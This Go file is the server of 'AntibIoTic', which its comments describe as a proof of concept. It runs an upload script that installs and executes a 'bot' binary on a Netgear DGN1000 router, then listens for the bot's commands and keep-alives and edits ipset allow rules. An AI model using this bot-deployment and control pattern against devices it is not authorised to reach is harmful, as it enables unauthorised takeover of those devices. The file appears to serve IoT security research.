package main

/*
AntibIoTic server.
Can send command to client and receive keep-alive messages.
This is a proof of concept to test AntibIoTic.
*/

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strings"
	"os/exec"
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}

// Executes the command to upload and run the bot to one device
func uploadAndRunBot(command string, args []string) {
	err := exec.Command(command, args...).Run()
	if err != nil{
		fmt.Println("Error while upload and running bot: ", err)
	}
}

// type that symbolizes the configuration of a device, holding its name, ip and the
// necessary command and arguments to upload and run the bot
type deviceConfig struct {
	name string
	ip string
	command string
	args []string
}

func main() {

	devices := []deviceConfig {
		deviceConfig {
			name: "Netgear DGN1000",
			ip: "192.168.0.1",
			command: "python3",
			args: []string{"./tools/upload.py", "-r", "192.168.0.1", "-l", "192.168.0.2", "-f", "./bin/antibiotic_debug_mips", "-n", "antibiotic", "-x", "-e"},
		},
	}

	// for all configured devices, upload and run the bot
	for _, device := range devices {
		fmt.Printf("\nUploading and running bot\n  Device: %s\n  IP: %s\n", device.name, device.ip)
    	go uploadAndRunBot(device.command, device.args)
	}
	
	for 
	{
		// Listen on all interfaces
		ln, err := net.Listen("tcp", ":1234")
		check(err)

		fmt.Println("Listening on", ln.Addr())

		// Accept connection
		fmt.Println("Waiting for connection...")
		conn, err := ln.Accept()
		check(err)

		fmt.Println("Connected to", conn.RemoteAddr())

		// Start command receiver
		go commandReceiver(conn)

		keepAliveReceiver()
		
		conn.Close()
		ln.Close()
	}

}

func send(conn net.Conn, cmd byte, data []byte) (err error) {
	// Send data size
	//fmt.Println("Sending data size:", uint16(len(data)))
	err = binary.Write(conn, binary.BigEndian, uint16(len(data)))
	if err != nil {
		return
	}

	// Send data type
	_, err = conn.Write([]byte{cmd})
	if err != nil {
		return
	}

	// Send data
	if data != nil {
		_, err = conn.Write(data)
		if err != nil {
			return
		}
	}

	return
}

func receive(conn net.Conn) (dataType byte, data []byte, err error) {
	// Receive size
	var size uint16
	err = binary.Read(conn, binary.BigEndian, &size)
	if err != nil {
		return
	}

	dataReceived := make([]byte, size+1)

	// Receive data and date type
	_, err = io.ReadFull(conn, dataReceived)
	if err != nil {
		return
	}

	return dataReceived[0], dataReceived[1:], err
}

func keepAliveReceiver() {
	for {
		// Listen on all interfaces
		ln, err := net.Listen("tcp", ":4321")
		check(err)

		// Accept connection
		conn, err := ln.Accept()
		check(err)
		// Receive keep-alive messages
		for {
			msg := make([]byte, 2)

			_, err = io.ReadFull(conn, msg)
			if err != nil {
				fmt.Println("Keep alive socket err:", err)
				// if connection is severed, block IP address
				ipAddress := extractIpAddress(conn.RemoteAddr().String())
				blockIPAddress(ipAddress)
				break
			}
			fmt.Println("\nReceived keep-alive message")
			// if properly received, allow Ip address
			ipAddress := extractIpAddress(conn.RemoteAddr().String())
			allowIPAddress(ipAddress)
		}
		conn.Close()
		ln.Close()
		return
	}
}



func commandReceiver(conn net.Conn) {
	for {
		cmd, data, err := receive(conn)
		if err != nil{
			fmt.Println("command receiver error:", err)
			return
		}
		//check(err)
		fmt.Printf("\nReceived command %x with data: %s\n", cmd, data)
	}
}



// Takes an ipaddress and a port in format "n1.n2.n3.n4:portNo" and returns "n1.n2.n3.n4"
func extractIpAddress(ipAddressAndPort string) (string){
	parts := strings.Split(ipAddressAndPort, ":")
	return parts[0]
}

// removes ipAddress from the allowed_ips ipset
func blockIPAddress(ipAddress string) {
	exec.Command("ipset", "del", "allowed_ips", ipAddress).Run()
	fmt.Println("Blocking IP address ", ipAddress)
}

// adds ipAddress from the allowed_ips ipset
func allowIPAddress(ipAddress string) {
	exec.Command("ipset", "add", "allowed_ips", ipAddress).Run()
	fmt.Println("Allowing IP address ", ipAddress)
}

// debug function to quickly show the iptables rules and the allowed_ips ipset
func showIPRules() {
	fmt.Println("-----------------------------")
	out, _ := exec.Command("iptables", "-L").Output()
	fmt.Println(string(out))
	fmt.Println("--------------")
	out, _ = exec.Command("ipset", "list", "allowed_ips").Output()
	fmt.Println(string(out))
	fmt.Println("-----------------------------")
}
